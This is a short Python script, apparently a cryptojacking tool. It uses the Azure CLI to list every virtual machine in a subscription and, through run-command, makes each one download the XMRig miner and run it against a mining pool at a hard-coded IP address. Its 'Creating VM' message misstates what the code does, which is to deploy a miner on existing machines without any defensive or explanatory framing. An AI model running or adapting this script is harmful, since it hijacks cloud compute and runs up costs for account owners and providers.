from azure.cli.core import get_default_cli
import json,os
import multiprocessing

print('''
                                                                     _______________
                                                                     < Dhen, Sapatha! >
                                                                      ---------------
                                                                             \   ^__^
                                                                              \  (oo)\_______
                                                                                 (__)\       )\/\\
                                                                                     ||----w |
                                                                                     ||     ||
                
                                                        AUTHOR : @sAmPawam ThUwAraKan    | karupiyagounder@gmail.com    ''')



sn    = ""

def az_cli (args_str):
    args = args_str.split()
    cli = get_default_cli()
    cli.invoke(args)
    if cli.result.result:
        return(cli.result.result)    
    elif cli.result.error:
        print("ERROR")    
    return True

print("* Creating VM")
#calling for Locations
response = az_cli('vm list')

def deployer(x):
        
            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://raw.githubusercontent.com/xmrig/xmrig/dev/scripts/enable_1gb_pages.sh && sudo sh enable_1gb_pages.sh && wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvzf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && sudo ./xmrig -o 20.169.8.123:3333" ' 
            
        
            print("      * Script Executing : "+runC)
            os.system(runC)
            
for x in range(len(response)):
        p =  multiprocessing.Process(target= deployer, args = [response[x]["osProfile"]["computerName"]])
        p.start()
        print(response[x]["osProfile"]["computerName"])
        print(x)
print ("* SUCCSESS")

